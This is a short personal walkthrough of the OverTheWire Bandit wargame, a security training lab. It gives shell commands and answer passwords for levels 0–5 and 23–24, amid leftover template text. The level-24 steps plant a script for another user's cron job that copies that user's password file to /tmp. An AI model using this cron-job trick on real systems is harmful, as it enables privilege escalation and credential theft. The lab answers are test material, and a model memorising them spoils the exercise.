# aa
# Bandit Walkthrough
### Level 0

# Copyable Text Example

This text is **copyable**. Just select and copy it!

## Code Block Example
You can include code that is also copyable:
ssh bandit0@bandit.labs.overthewire.org -p2220
ls
cat readme
# Password: `ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If` [Copy](javascript:void(0))
cat ./
# Password: `263JGJPfgU6LtdEvgfWU1XP5yac29mFx` [Copy](javascript:void(0))
cat "spaces in this filename"
# Password: `MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx` [Copy](javascript:void(0))
cat ...Hiding-From-You
# Password: `2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ` [Copy](javascript:void(0))
file ./*
cat ./-file07
# Password: `4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw` [Copy](javascript:void(0))

23

cd /etc/cron.d/
cat cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh
echo I am user bandit23 | md5sum | cut -d ' ' -f 1
cat /tmp/8ca319486bfbbc3663ea0fbe81326349
# Password: **0Zf11ioIjMVN551jX3CmStKLYqjk54Ga** 

24
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
echo '#!/bin/bash' > /var/spool/bandit24/foo/script.sh
echo '' >> /var/spool/bandit24/foo/script.sh
echo "cat /etc/bandit_pass/bandit24 > /tmp/secret" >> /var/spool/bandit24/foo/script.sh
chmod +rx /var/spool/bandit24/foo/script.sh
cat /var/spool/bandit24/foo/script.sh
cat /tmp/secret
# Password: **gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8**
